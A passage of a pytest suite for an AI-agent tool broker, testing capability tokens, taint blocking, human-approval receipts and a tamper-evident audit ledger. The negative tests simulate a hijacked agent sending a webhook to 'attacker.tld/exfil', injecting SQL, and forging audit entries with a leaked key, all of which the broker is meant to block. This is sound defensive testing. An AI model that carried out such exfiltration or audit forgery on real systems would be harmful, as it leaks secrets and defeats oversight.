            "arguments": {"sql": "SELECT id, title FROM tasks", "params": []},
        },
    )
    assert r_sel.status_code == 200


def test_pos_d4_tainted_sink_with_valid_hitl_receipt(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "hitl_worker",
            "caveat": {
                "allowed_tools": ["fs.read", "fs.write", "db.query"],
                "allowed_path_prefixes": [
                    str(cfg.sandbox_root / "reports"),
                    str(cfg.sandbox_root / "inbox"),
                ],
                "sql_read_only": False,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_p2",
            "token": tok,
            "tool_name": "fs.read",
            "arguments": {"path": str(cfg.sandbox_root / "inbox" / "ticket_42.txt")},
        },
    )

    out_path = cfg.sandbox_root / "reports" / "2026" / "approved_out.txt"
    content = f"human_approved_{secrets.token_hex(6)}"
    receipt = create_hitl_receipt(
        session_id="sess_d4_p2",
        tool_name="fs.write",
        canonical_args={"content": content, "path": str(out_path)},
        expires_at=now + 600,
        nonce=f"nonce_valid_{secrets.token_hex(8)}",
        hitl_key_hex=cfg.hitl_key_hex,
    )

    r_write = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_p2",
            "token": tok,
            "tool_name": "fs.write",
            "arguments": {"path": str(out_path), "content": content},
            "hitl_receipt": receipt.to_dict(),
        },
    )
    assert r_write.status_code == 200
    assert out_path.read_text(encoding="utf-8") == content


def test_neg_d4_tainted_blocks_fs_sql_webhook_sinks(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "hijacked_agent",
            "caveat": {
                "allowed_tools": ["fs.read", "fs.write", "db.query", "webhook.send"],
                "allowed_path_prefixes": [
                    str(cfg.sandbox_root / "reports"),
                    str(cfg.sandbox_root / "inbox"),
                ],
                "sql_read_only": False,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    r_inb = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_n1",
            "token": tok,
            "tool_name": "fs.read",
            "arguments": {"path": str(cfg.sandbox_root / "inbox" / "ticket_42.txt")},
        },
    )
    assert r_inb.status_code == 200

    n0 = len(_read_audit_entries(cfg))
    r_wh = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_n1",
            "token": tok,
            "tool_name": "webhook.send",
            "arguments": {"destination": "https://attacker.tld/exfil", "payload": "secret"},
        },
    )
    _assert_denied_with_audit(cfg, r_wh, 403, "TAINT_VIOLATION", n0)
    assert not cfg.webhook_sink_path.exists()

    bad_file = cfg.sandbox_root / "reports" / "injected.txt"
    n1 = len(_read_audit_entries(cfg))
    r_fw = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_n1",
            "token": tok,
            "tool_name": "fs.write",
            "arguments": {"path": str(bad_file), "content": "injected"},
        },
    )
    _assert_denied_with_audit(cfg, r_fw, 403, "TAINT_VIOLATION", n1)
    assert not bad_file.exists()

    n2 = len(_read_audit_entries(cfg))
    r_sql = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_n1",
            "token": tok,
            "tool_name": "db.query",
            "arguments": {
                "sql": "INSERT INTO tasks (title, status) VALUES ('injected_task', 'OPEN')",
                "params": [],
            },
        },
    )
    _assert_denied_with_audit(cfg, r_sql, 403, "TAINT_VIOLATION", n2)


def test_neg_d4_hitl_nonce_replay_blocked(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "replay_agent",
            "caveat": {
                "allowed_tools": ["fs.read", "fs.write"],
                "allowed_path_prefixes": [
                    str(cfg.sandbox_root / "reports"),
                    str(cfg.sandbox_root / "inbox"),
                ],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_n2",
            "token": tok,
            "tool_name": "fs.read",
            "arguments": {"path": str(cfg.sandbox_root / "inbox" / "ticket_42.txt")},
        },
    )

    target = cfg.sandbox_root / "reports" / "once.txt"
    receipt = create_hitl_receipt(
        session_id="sess_d4_n2",
        tool_name="fs.write",
        canonical_args={"content": "first_write", "path": str(target)},
        expires_at=now + 600,
        nonce="single_use_nonce_99887766",
        hitl_key_hex=cfg.hitl_key_hex,
    )

    r1 = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_n2",
            "token": tok,
            "tool_name": "fs.write",
            "arguments": {"path": str(target), "content": "first_write"},
            "hitl_receipt": receipt.to_dict(),
        },
    )
    assert r1.status_code == 200

    n_before = len(_read_audit_entries(cfg))
    r2 = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_n2",
            "token": tok,
            "tool_name": "fs.write",
            "arguments": {"path": str(target), "content": "first_write"},
            "hitl_receipt": receipt.to_dict(),
        },
    )
    _assert_denied_with_audit(cfg, r2, 403, "HITL_NONCE_REPLAYED", n_before)


def test_neg_d4_hitl_modified_args_or_expired_blocked(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "tamper_hitl_agent",
            "caveat": {
                "allowed_tools": ["fs.read", "fs.write"],
                "allowed_path_prefixes": [
                    str(cfg.sandbox_root / "reports"),
                    str(cfg.sandbox_root / "inbox"),
                ],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_n3",
            "token": tok,
            "tool_name": "fs.read",
            "arguments": {"path": str(cfg.sandbox_root / "inbox" / "ticket_42.txt")},
        },
    )

    target = cfg.sandbox_root / "reports" / "tampered_out.txt"
    valid_receipt = create_hitl_receipt(
        session_id="sess_d4_n3",
        tool_name="fs.write",
        canonical_args={"content": "approved_text", "path": str(target)},
        expires_at=now + 600,
        nonce="fresh_nonce_binding_112233",
        hitl_key_hex=cfg.hitl_key_hex,
    )

    n0 = len(_read_audit_entries(cfg))
    r_mismatch = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_n3",
            "token": tok,
            "tool_name": "fs.write",
            "arguments": {"path": str(target), "content": "approved_text!"},
            "hitl_receipt": valid_receipt.to_dict(),
        },
    )
    _assert_denied_with_audit(cfg, r_mismatch, 403, "HITL_BINDING_MISMATCH", n0)
    assert not target.exists()

    expired_receipt = create_hitl_receipt(
        session_id="sess_d4_n3",
        tool_name="fs.write",
        canonical_args={"content": "approved_text", "path": str(target)},
        expires_at=now - 10,
        nonce="fresh_nonce_expired_445566",
        hitl_key_hex=cfg.hitl_key_hex,
    )
    n1 = len(_read_audit_entries(cfg))
    r_exp = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_n3",
            "token": tok,
            "tool_name": "fs.write",
            "arguments": {"path": str(target), "content": "approved_text"},
            "hitl_receipt": expired_receipt.to_dict(),
        },
    )
    _assert_denied_with_audit(cfg, r_exp, 403, "HITL_RECEIPT_EXPIRED", n1)

    bad_sig_receipt = create_hitl_receipt(
        session_id="sess_d4_n3",
        tool_name="fs.write",
        canonical_args={"content": "approved_text", "path": str(target)},
        expires_at=now + 600,
        nonce="fresh_nonce_badsig_778899",
        hitl_key_hex=secrets.token_hex(32),
    )
    n2 = len(_read_audit_entries(cfg))
    r_sig = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_n3",
            "token": tok,
            "tool_name": "fs.write",
            "arguments": {"path": str(target), "content": "approved_text"},
            "hitl_receipt": bad_sig_receipt.to_dict(),
        },
    )
    _assert_denied_with_audit(cfg, r_sig, 403, "INVALID_HITL_SIGNATURE", n2)


def test_neg_d4_second_sink_after_single_receipt_blocked(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "single_scope_agent",
            "caveat": {
                "allowed_tools": ["fs.read", "fs.write", "webhook.send"],
                "allowed_path_prefixes": [
                    str(cfg.sandbox_root / "reports"),
                    str(cfg.sandbox_root / "inbox"),
                ],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_n4",
            "token": tok,
            "tool_name": "fs.read",
            "arguments": {"path": str(cfg.sandbox_root / "inbox" / "ticket_42.txt")},
        },
    )

    target = cfg.sandbox_root / "reports" / "first_approved.txt"
    receipt = create_hitl_receipt(
        session_id="sess_d4_n4",
        tool_name="fs.write",
        canonical_args={"content": "ok_1", "path": str(target)},
        expires_at=now + 600,
        nonce="nonce_single_call_scope_01",
        hitl_key_hex=cfg.hitl_key_hex,
    )
    r1 = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_n4",
            "token": tok,
            "tool_name": "fs.write",
            "arguments": {"path": str(target), "content": "ok_1"},
            "hitl_receipt": receipt.to_dict(),
        },
    )
    assert r1.status_code == 200

    n_before = len(_read_audit_entries(cfg))
    r2 = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_n4",
            "token": tok,
            "tool_name": "webhook.send",
            "arguments": {"destination": "https://internal.local/hook", "payload": "sneaky"},
        },
    )
    _assert_denied_with_audit(cfg, r2, 403, "TAINT_VIOLATION", n_before)


# ============================================================================
# DOMAIN 5: FORWARD-RATCHETED AUDIT & CRASH RECOVERY (2 Positive + 4 Negative)
# ============================================================================


def test_pos_d5_mixed_ledger_and_anchor_verify(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "audit_tester",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    valid_file = str(cfg.sandbox_root / "reports" / "2026" / "q3" / "summary.txt")
    forbidden_file = str(cfg.sandbox_root / "vault" / "secrets.json")

    r0 = client.post(
        "/v1/tools/invoke",
        json={"session_id": "s_aud", "token": tok, "tool_name": "fs.read", "arguments": {"path": valid_file}},
    )
    assert r0.status_code == 200
    assert r0.json()["audit_receipt"]["seq"] == 0

    r1 = client.post(
        "/v1/tools/invoke",
        json={"session_id": "s_aud", "token": tok, "tool_name": "fs.read", "arguments": {"path": forbidden_file}},
    )
    assert r1.status_code == 403
    assert r1.json()["audit_receipt"]["seq"] == 1

    r2 = client.post(
        "/v1/tools/invoke",
        json={"session_id": "s_aud", "token": tok, "tool_name": "fs.read", "arguments": {"path": valid_file}},
    )
    assert r2.status_code == 200
    assert r2.json()["audit_receipt"]["seq"] == 2

    r3 = client.post(
        "/v1/tools/invoke",
        json={"session_id": "s_aud", "token": tok, "tool_name": "fs.write", "arguments": {"path": valid_file, "content": "no"}},
    )
    assert r3.status_code == 403
    assert r3.json()["audit_receipt"]["seq"] == 3

    ratchet_data = json.loads(cfg.ratchet_state_path.read_text(encoding="utf-8"))
    assert ratchet_data["next_seq"] == 4
    expected_k4 = cfg.genesis_audit_key_hex
    expected_a4 = cfg.genesis_anchor_key_hex
    for _ in range(4):
        expected_k4 = _sha256_hex_bytes(expected_k4)
        expected_a4 = _sha256_hex_bytes(expected_a4)
    assert ratchet_data["signing_key_hex"] == expected_k4
    assert ratchet_data["anchor_key_hex"] == expected_a4

    res = verify_audit_ledger(
        ledger_path=cfg.audit_ledger_path,
        anchor_path=cfg.audit_anchor_path,
        ratchet_path=cfg.ratchet_state_path,
        trusted_genesis_audit_key_hex=cfg.genesis_audit_key_hex,
        trusted_genesis_anchor_key_hex=cfg.genesis_anchor_key_hex,
        expected_min_seq=3,
    )
    assert res.valid is True
    assert res.entries_checked == 4


def _build_wal_commit_bytes(
    seq: int,
    entry_line: str,
    anchor_obj: dict[str, Any],
    next_ratchet_obj: dict[str, Any],
) -> str:
    core = {
        "anchor_obj": anchor_obj,
        "entry_line": entry_line,
        "next_ratchet_obj": next_ratchet_obj,
        "seq": seq,
    }
    core_bytes = json.dumps(core, sort_keys=True, separators=(",", ":")).encode("utf-8")
    wal_sha256 = hashlib.sha256(core_bytes).hexdigest()
    full_wal = dict(core)
    full_wal["wal_sha256"] = wal_sha256
    return json.dumps(full_wal, sort_keys=True, separators=(",", ":")) + "\n"


def test_pos_d5_wal_crash_recovery_all_three_cases(tmp_path: Path) -> None:
    cfg_ref, client_ref = _setup_isolated_broker(tmp_path, subdir="ref")
    now = int(time.time())
    tok_ref = client_ref.post(
        "/v1/tokens/mint",
        json={
            "principal": "wal_tester",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg_ref.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()
    summary_ref = str(cfg_ref.sandbox_root / "reports" / "2026" / "q3" / "summary.txt")

    client_ref.post(
        "/v1/tools/invoke",
        json={"session_id": "s_wal", "token": tok_ref, "tool_name": "fs.read", "arguments": {"path": summary_ref}},
    )
    client_ref.post(
        "/v1/tools/invoke",
        json={"session_id": "s_wal", "token": tok_ref, "tool_name": "fs.read", "arguments": {"path": summary_ref}},
    )

    ledger_at_1 = cfg_ref.audit_ledger_path.read_text(encoding="utf-8")
    anchor_at_1 = cfg_ref.audit_anchor_path.read_text(encoding="utf-8")
    ratchet_at_1 = cfg_ref.ratchet_state_path.read_text(encoding="utf-8")

    client_ref.post(
        "/v1/tools/invoke",
        json={"session_id": "s_wal", "token": tok_ref, "tool_name": "fs.read", "arguments": {"path": summary_ref}},
    )
    ledger_at_2 = cfg_ref.audit_ledger_path.read_text(encoding="utf-8")
    anchor_at_2 = cfg_ref.audit_anchor_path.read_text(encoding="utf-8")
    ratchet_at_2 = cfg_ref.ratchet_state_path.read_text(encoding="utf-8")

    lines_at_2 = [ln for ln in ledger_at_2.splitlines() if ln.strip()]
    assert len(lines_at_2) == 3
    entry_line_2 = lines_at_2[2]
    anchor_obj_2 = json.loads(anchor_at_2)
    ratchet_obj_2 = json.loads(ratchet_at_2)
    assert ratchet_obj_2["next_seq"] == 3

    wal_commit_text = _build_wal_commit_bytes(
        seq=2,
        entry_line=entry_line_2,
        anchor_obj=anchor_obj_2,
        next_ratchet_obj=ratchet_obj_2,
    )

    # CASE A: Crash after writing ledger (seq=2), before updating anchor (seq=1)
    cfg_ref.audit_ledger_path.write_text(ledger_at_2, encoding="utf-8")
    cfg_ref.audit_anchor_path.write_text(anchor_at_1, encoding="utf-8")
    cfg_ref.ratchet_state_path.write_text(ratchet_at_1, encoding="utf-8")
    cfg_ref.audit_wal_commit_path.write_text(wal_commit_text, encoding="utf-8")

    r_seq3 = client_ref.post(
        "/v1/tools/invoke",
        json={"session_id": "s_wal", "token": tok_ref, "tool_name": "fs.read", "arguments": {"path": summary_ref}},
    )
    assert r_seq3.status_code == 200
    assert r_seq3.json()["audit_receipt"]["seq"] == 3
    assert not cfg_ref.audit_wal_commit_path.exists()
    res_a = verify_audit_ledger(
        cfg_ref.audit_ledger_path,
        cfg_ref.audit_anchor_path,
        cfg_ref.ratchet_state_path,
        cfg_ref.genesis_audit_key_hex,
        cfg_ref.genesis_anchor_key_hex,
        expected_min_seq=3,
    )
    assert res_a.valid is True and res_a.entries_checked == 4

    # CASE B: Crash after updating anchor (seq=2), before confirming ledger (seq=1)
    cfg_ref.audit_ledger_path.write_text(ledger_at_1, encoding="utf-8")
    cfg_ref.audit_anchor_path.write_text(anchor_at_2, encoding="utf-8")
    cfg_ref.ratchet_state_path.write_text(ratchet_at_1, encoding="utf-8")
    cfg_ref.audit_wal_commit_path.write_text(wal_commit_text, encoding="utf-8")

    r_seq3_b = client_ref.post(
        "/v1/tools/invoke",
        json={"session_id": "s_wal", "token": tok_ref, "tool_name": "fs.read", "arguments": {"path": summary_ref}},
    )
    assert r_seq3_b.status_code == 200
    assert r_seq3_b.json()["audit_receipt"]["seq"] == 3
    assert not cfg_ref.audit_wal_commit_path.exists()
    res_b = verify_audit_ledger(
        cfg_ref.audit_ledger_path,
        cfg_ref.audit_anchor_path,
        cfg_ref.ratchet_state_path,
        cfg_ref.genesis_audit_key_hex,
        cfg_ref.genesis_anchor_key_hex,
        expected_min_seq=3,
    )
    assert res_b.valid is True and res_b.entries_checked == 4

    # CASE C: Crash during incomplete/torn write (torn JSON line + WAL, and torn .tmp)
    cfg_ref.audit_ledger_path.write_text(ledger_at_1 + '{"seq":2,"torn_json', encoding="utf-8")
    cfg_ref.audit_anchor_path.write_text(anchor_at_1, encoding="utf-8")
    cfg_ref.ratchet_state_path.write_text(ratchet_at_1, encoding="utf-8")
    cfg_ref.audit_wal_commit_path.write_text(wal_commit_text, encoding="utf-8")
    cfg_ref.audit_wal_tmp_path.write_text('{"incomplete_tmp', encoding="utf-8")

    r_seq3_c = client_ref.post(
        "/v1/tools/invoke",
        json={"session_id": "s_wal", "token": tok_ref, "tool_name": "fs.read", "arguments": {"path": summary_ref}},
    )
    assert r_seq3_c.status_code == 200
    assert r_seq3_c.json()["audit_receipt"]["seq"] == 3
    assert not cfg_ref.audit_wal_commit_path.exists()
    assert not cfg_ref.audit_wal_tmp_path.exists()
    res_c = verify_audit_ledger(
        cfg_ref.audit_ledger_path,
        cfg_ref.audit_anchor_path,
        cfg_ref.ratchet_state_path,
        cfg_ref.genesis_audit_key_hex,
        cfg_ref.genesis_anchor_key_hex,
        expected_min_seq=3,
    )
    assert res_c.valid is True and res_c.entries_checked == 4


def test_neg_d5_detects_mutated_historical_entry(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "audit_mut_tester",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()
    valid_file = str(cfg.sandbox_root / "reports" / "2026" / "q3" / "summary.txt")
    bad_file = str(cfg.sandbox_root / "vault" / "secrets.json")

    client.post("/v1/tools/invoke", json={"session_id": "s1", "token": tok, "tool_name": "fs.read", "arguments": {"path": valid_file}})
    client.post("/v1/tools/invoke", json={"session_id": "s1", "token": tok, "tool_name": "fs.read", "arguments": {"path": bad_file}})
    client.post("/v1/tools/invoke", json={"session_id": "s1", "token": tok, "tool_name": "fs.read", "arguments": {"path": valid_file}})

    lines = cfg.audit_ledger_path.read_text(encoding="utf-8").splitlines()
    entry1 = json.loads(lines[1])
    entry1["decision"] = "ALLOW"
    lines[1] = json.dumps(entry1, sort_keys=True, separators=(",", ":"))
    cfg.audit_ledger_path.write_text("\n".join(lines) + "\n", encoding="utf-8")

    res = verify_audit_ledger(
        ledger_path=cfg.audit_ledger_path,
        anchor_path=cfg.audit_anchor_path,
        ratchet_path=cfg.ratchet_state_path,
        trusted_genesis_audit_key_hex=cfg.genesis_audit_key_hex,
        trusted_genesis_anchor_key_hex=cfg.genesis_anchor_key_hex,
    )
    assert res.valid is False
    assert res.first_corrupted_seq == 1


def test_neg_d5_detects_resign_with_dumped_ratchet_key(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "audit_dump_tester",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()
    valid_file = str(cfg.sandbox_root / "reports" / "2026" / "q3" / "summary.txt")

    for _ in range(3):
        client.post("/v1/tools/invoke", json={"session_id": "s2", "token": tok, "tool_name": "fs.read", "arguments": {"path": valid_file}})

    dumped_ratchet = json.loads(cfg.ratchet_state_path.read_text(encoding="utf-8"))
    dumped_k3 = dumped_ratchet["signing_key_hex"]

    lines = cfg.audit_ledger_path.read_text(encoding="utf-8").splitlines()
    entry1 = json.loads(lines[1])
    entry1["session_id"] = "forged_session_with_k3"
    entry1_core = {k: v for k, v in entry1.items() if k != "entry_hmac"}
    raw_core = json.dumps(entry1_core, sort_keys=True, separators=(",", ":"))
    forged_hmac = hmac.new(
        bytes.fromhex(dumped_k3),
        f"1|{entry1['prev_entry_hmac']}|{raw_core}".encode("utf-8"),
        hashlib.sha256,
    ).hexdigest()
    entry1["entry_hmac"] = forged_hmac
    lines[1] = json.dumps(entry1, sort_keys=True, separators=(",", ":"))
    cfg.audit_ledger_path.write_text("\n".join(lines) + "\n", encoding="utf-8")

    res = verify_audit_ledger(
        ledger_path=cfg.audit_ledger_path,
        anchor_path=cfg.audit_anchor_path,
        ratchet_path=cfg.ratchet_state_path,
        trusted_genesis_audit_key_hex=cfg.genesis_audit_key_hex,
        trusted_genesis_anchor_key_hex=cfg.genesis_anchor_key_hex,
    )
    assert res.valid is False
    assert res.first_corrupted_seq == 1


def test_neg_d5_detects_tail_truncation_and_rollback(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "audit_trunc_tester",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()
    valid_file = str(cfg.sandbox_root / "reports" / "2026" / "q3" / "summary.txt")

    for _ in range(4):
        client.post("/v1/tools/invoke", json={"session_id": "s3", "token": tok, "tool_name": "fs.read", "arguments": {"path": valid_file}})

    lines = cfg.audit_ledger_path.read_text(encoding="utf-8").splitlines()
    cfg.audit_ledger_path.write_text("\n".join(lines[:2]) + "\n", encoding="utf-8")

    res = verify_audit_ledger(
        ledger_path=cfg.audit_ledger_path,
        anchor_path=cfg.audit_anchor_path,
        ratchet_path=cfg.ratchet_state_path,
        trusted_genesis_audit_key_hex=cfg.genesis_audit_key_hex,
        trusted_genesis_anchor_key_hex=cfg.genesis_anchor_key_hex,
    )
    assert res.valid is False
    assert res.first_corrupted_seq == 2


def test_neg_d5_unrecoverable_tamper_fails_closed_503(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "fail_closed_tester",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()
    valid_file = str(cfg.sandbox_root / "reports" / "2026" / "q3" / "summary.txt")

    client.post("/v1/tools/invoke", json={"session_id": "s4", "token": tok, "tool_name": "fs.read", "arguments": {"path": valid_file}})
    client.post("/v1/tools/invoke", json={"session_id": "s4", "token": tok, "tool_name": "fs.read", "arguments": {"path": valid_file}})

    lines = cfg.audit_ledger_path.read_text(encoding="utf-8").splitlines()
    cfg.audit_ledger_path.write_text(lines[0] + "\n", encoding="utf-8")

    r_fail = client.post(
        "/v1/tools/invoke",
        json={"session_id": "s4", "token": tok, "tool_name": "fs.read", "arguments": {"path": valid_file}},
    )
    assert r_fail.status_code == 503
    assert r_fail.json().get("error_code") == "AUDIT_STATE_CORRUPTED"
